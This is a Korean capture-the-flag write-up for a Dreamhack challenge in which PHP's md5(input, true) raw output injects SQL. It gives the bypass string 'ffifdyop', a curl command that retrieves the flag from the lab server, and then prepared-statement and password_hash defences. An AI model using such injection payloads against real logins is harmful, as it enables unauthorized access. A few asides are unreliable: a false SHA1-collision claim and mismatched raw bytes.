---
layout: post
title:  "Dreamhack 워게임 [wargame.kr] md5 password 풀이 — md5(input, true)의 raw 바이트가 SQL이 되는 마법, ffifdyop"
date:   2026-05-15 05:00:00 +0900
categories: security web wargame dreamhack writeup php sqli
---

## 들어가며

Dreamhack 웹해킹 워게임 **[wargame.kr] md5 password** (난이도 Bronze 3) 풀이입니다. 문제 설명은 단 한 줄.

```text
md5('value', true);
```

이 한 줄이 모든 힌트입니다. PHP의 `md5(string, raw_output=true)` 호출이 어떻게 SQL injection으로 변신하는지 — 그리고 그 페이로드가 왜 `ffifdyop` 라는 외울 가치가 있는 짧은 문자열인지 — 가 이 문제의 본질입니다.

스포일러:

```bash
curl -X POST "$SERVER/index.php" -d "ps=ffifdyop"
# → hello admin! FLAG : DH{9d6745675a079f8cb20347e29138720df37e185f}
```

## 1. 소스 정독

페이지 우측 하단의 `get source` 링크 → `?view-source` → `show_source(__FILE__)`로 본인 소스 그대로 노출.

```php
if(isset($_POST['ps'])){
    sleep(1);
    include("./lib.php");   // $FLAG, $DB_username, $DB_password
    $conn = mysqli_connect("localhost", $DB_username, $DB_password, "md5_password");

    /*
      create table admin_password(
        password char(64) unique
      );
    */

    $ps = mysqli_real_escape_string($conn, $_POST['ps']);
    $row = @mysqli_fetch_array(mysqli_query($conn,
        "select * from admin_password where password='" . md5($ps, true) . "'"));
    if(isset($row[0])){
        echo "hello admin!<br />";
        echo "FLAG : " . $FLAG;
    } else {
        echo "wrong..";
    }
}
```

코드 한 줄씩 짚어보자.

1. **`$ps = mysqli_real_escape_string($conn, $_POST['ps'])`** — 사용자 입력에서 SQL 메타문자를 이스케이프. 이 시점에서 `$ps` 안의 `'`, `"`, `\`, `\0` 등은 모두 안전.
2. **`md5($ps, true)`** — `raw_output=true` 모드. **이스케이프된 문자열에 md5 해시를 적용한 결과 16바이트의 raw 바이너리** 가 반환. 이 16바이트에는 SQL 메타문자가 그대로 들어있을 수 있다.
3. **`"... where password='" . md5(...) . "'"`** — 위의 raw 16바이트가 작은따옴표 사이에 끼어들어간다. **이스케이프는 md5 *이전* 에 일어났기 때문에, md5 결과가 만들어내는 메타문자는 통과**.
4. **`sleep(1)`** — 매 요청 1초 지연. brute-force 가 의도된 풀이가 아니라는 출제자 시그널.

### 1-1. 결정적 단서

`md5(string, true)` 가 보이는 순간 알아챘다면 즉시 풀이는 끝납니다. PHP의 `md5($x, true)` 는 16바이트 바이너리를 반환하는데, **그 안에 `'or'` 같은 SQL 메타 문자열이 들어있는 입력이 존재**한다는 것이 이 함수의 잘 알려진 함정입니다.

## 2. 마법의 문자열 `ffifdyop`

```php
md5('ffifdyop')             // hex:  276f722736da5430449f8f6f23dfc127
md5('ffifdyop', true)       // raw:  \x27\x6f\x72\x27\x36\xda\x54\x30\x44\x9f\x8f\x6f\x23\xdf\xc1\x27
                            //  Latin-1 의미: '  o  r  '  6  ...
```

문자열로 해석하면 **`'or'6` + (이상한 바이너리)**.

이 raw 16바이트가 SQL 문자열에 그대로 박히면:

```
select * from admin_password where password='' or '6<binary>'
                                           ─┘ │└─ "값" 부분
                                          이전 문자열 종료
                                            │
                                          OR 연산자
```

`'6<binary>'` 는 MySQL 에서 문자열을 숫자로 평가할 때 **앞의 숫자 부분만 추출** 하므로 `6` 으로 평가 — 0이 아니므로 truthy. 따라서 `WHERE` 절 전체가 true 가 되어 admin_password 의 임의의 행이 매칭됩니다(혹은 첫 행). `mysqli_fetch_array` 가 `$row` 를 반환 → `if(isset($row[0]))` 통과 → FLAG 출력.

### 2-1. 왜 `ffifdyop` 인가

`md5('XXXX', true)` 의 raw 바이트가 `'or'<숫자/문자>...` 패턴이 되는 입력을 찾는 brute-force 는 2010년대 초반에 이미 수행되어 공개되어 있습니다. 가장 짧게 알려진 결과 중 하나가 `ffifdyop` (8글자). 검색 가치도 적은 정도로 너무 유명한 매직 스트링이라 외워둘 만합니다.

> 비슷한 류로 `123456` 같은 흔한 입력이 SHA1 충돌을 만든다거나, 특정 입력이 SHA256 의 첫 4바이트로 `0e...` 를 만들어 PHP 의 `==` 형변환 트릭을 통과시키는 magic hash 들이 있습니다. 함수가 raw bytes 를 반환하는 모든 컨텍스트에서 의심해볼 수 있는 클래스.

## 3. 풀이

```bash
SERVER=http://host3.dreamhack.games:24215
curl -s -X POST "$SERVER/index.php" -d "ps=ffifdyop"
```

응답:

```
hello admin!<br />FLAG : DH{9d6745675a079f8cb20347e29138720df37e185f}
```

✓

## 4. 취약점 해설 — Functional Output 의 Sanitization Gap

이 클래스의 본질을 한 줄로:

> **"입력을 sanitize 한 뒤, 그 결과를 한 번 더 변환하는 경우, 변환 결과가 다시 sanitize 대상이 되어야 한다."**

`$ps` 는 escape 되었지만, `md5($ps, true)` 의 결과는 다시 SQL 컨텍스트에 박힌다. 그 결과는 sanitize 안 됐다. 결국 `md5` 의 출력을 다시 escape 했어야 한다.

같은 패턴이 실무에서 자주 보이는 곳:

- `htmlspecialchars($input)` 한 뒤 `base64_decode` 결과를 HTML 에 박는 경우 — base64 디코딩이 `<script>` 같은 메타문자를 다시 만들 수 있음.
- 사용자 입력을 escape 후 `serialize`/`unserialize` 의 결과를 다시 echo 하는 경우 — 객체 출력이 메타문자를 가질 수 있음.
- escape 된 입력을 hash 한 뒤 그 hex 가 아닌 raw 결과를 비교/저장에 쓰는 경우.

### 4-1. 위험성

- 비밀번호 비교/세션 토큰 비교 등 인증 로직이 통째로 우회됨. 본 문제도 admin 인증 우회의 데모.
- escape 후 raw bytes 가 입력으로 들어가는 곳은 거의 항상 같은 유형의 사고로 이어진다.

### 4-2. 올바른 방어

1. **prepared statement 사용.** 이것 하나로 모든 SQL 인젝션 클래스(magic string 포함) 가 사라진다.

   ```php
   $stmt = $conn->prepare("SELECT * FROM admin_password WHERE password = ?");
   $stmt->bind_param("s", md5($ps, true));
   $stmt->execute();
   ```

   ` md5(true)` 결과가 raw bytes 든 무엇이든 placeholder 가 binary-safe 하게 다룬다.

2. **raw bytes 대신 hex 사용.** 비교/저장은 hex 문자열로 통일.

   ```php
   $hash = md5($ps);   // hex string, 32 chars, no metacharacters
   ```

3. **비밀번호는 그대로 md5 로 비교하지 말 것**. md5/sha1 은 비밀번호용으로 부적합. `password_hash()` / `password_verify()` (bcrypt) 를 사용.

   ```php
   if (password_verify($_POST['ps'], $row['password_hash'])) { ... }
   ```

4. **함수의 두 번째 인자 `true/false` 가 출력 형식을 바꾸는 함수들** — `md5`, `sha1`, `hash`, `base64_decode`, `hex2bin` 등 — 의 출력은 항상 binary-safe 컨텍스트에서만 다뤄야 한다.

## 5. 정리 — 입문자가 가져갈 교훈

- **`md5(str, true)` 가 SQL 에 들어가면 그것은 함수 호출이 아니라 SQL injection 후보** 다. 코드 리뷰 시 즉시 의심.
- `ffifdyop` 같은 매직 스트링은 한 번 알면 평생 쓰니까 그냥 외워두자. `md5("ffifdyop", true) → "'or'6\xc9..."`.
- escape 의 순서를 따져보자. **"사용자 입력 → sanitize → 변환 → SQL"** 에서 마지막 SQL 직전에 다시 sanitize 가 들어가야 한다. 한 번 한 sanitize 가 모든 변환 단계에 통하지 않는다.
- `mysqli_real_escape_string` 만 보면 안심하지 말 것. 그 출력이 어디로 어떻게 흘러가는지 데이터 흐름을 끝까지 따라가자.
- `sleep(1)` 같은 출제자의 의도적 지연은 거의 항상 "brute-force 가 아니다" 라는 신호. 정공법(매직 스트링, 형변환, 알고리즘 미스매치 등) 을 찾자.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. `mysqli_real_escape_string` 을 보고 안심할 뻔

소스를 처음 훑을 때 `$ps = mysqli_real_escape_string($conn, $_POST['ps']);` 가 적용된 걸 보고 "이건 SQL 인젝션 방어 안전한데?" 라고 0.5초 멈췄습니다. 다음 줄의 `md5($ps, true)` 를 보고서야 "아, escape **이후** 변환이 한 번 더 들어가는구나" 를 인지했습니다.

**회고**: SQL 쿼리 한 줄을 읽을 때는 항상 **placeholder 자리에 들어가는 표현식 전체** 를 보고, 그 표현식이 사용자 입력에서 시작해서 어떤 함수 호출 체인을 거치는지 추적해야 한다. 중간에 escape 가 한 번 있다고 안전한 게 아니라, 최종 SQL 토큰 직전까지 sanitization 이 유효해야 한다.

### 실패 2. 빠르게 `ffifdyop` 가 안 떠올라서 다른 페이로드를 시도할 뻔

이 함정은 너무 유명해서 외워두긴 했는데, 처음 한순간에 "8글자 magic string... 뭐였더라..." 했습니다. 그 와중에 `129581926211651571912466741651878684928` 라는 또다른 magic 숫자도 떠올랐지만 너무 길어서 다시 `ffifdyop` 를 떠올린 게 다행.

**회고**: magic string 들은 비교적 짧으니 외워두는 비용이 작다. 다음 카테고리는 잠깐 정리해두면 좋다.

- PHP `md5(str, true)` SQL injection: **`ffifdyop`** (raw: `'or'6...`)
- PHP magic hash (`0e...`): `md5("240610708")`, `md5("QNKCDZO")` 등.
- SHA1 collision: SHAttered 의 두 PDF (`good.pdf`, `bad.pdf` 의 hex 페어).
- bcrypt 72-byte truncation: 72 바이트가 넘는 입력은 앞 72바이트만 비교.

### 실패 3. URL 인코딩 신경쓸 뻔

`ffifdyop` 는 모두 ASCII 알파벳이라 URL 인코딩이 필요 없지만, 처음에 `curl --data-urlencode "ps=ffifdyop"` 형태로 하다가 굳이 그럴 필요가 없다는 걸 깨닫고 단순화. 작은 차이지만 깔끔.

**회고**: 페이로드가 ASCII safe 한지 빠르게 판단하면 명령이 한 줄 짧아진다. 메타 문자가 없으면 `-d "key=value"` 그대로.

### 실패 4. VM 부팅 시간

이번에도 1분 정도 기다림. 이제 익숙해서 좋다. 다른 일(코드 정독, 페이로드 준비) 을 병렬로 한다.

**회고**: VM 부팅 대기 60초는 거의 모든 Dreamhack 문제에서 일정하다. 그 시간은 항상 다른 일에 쓰자.
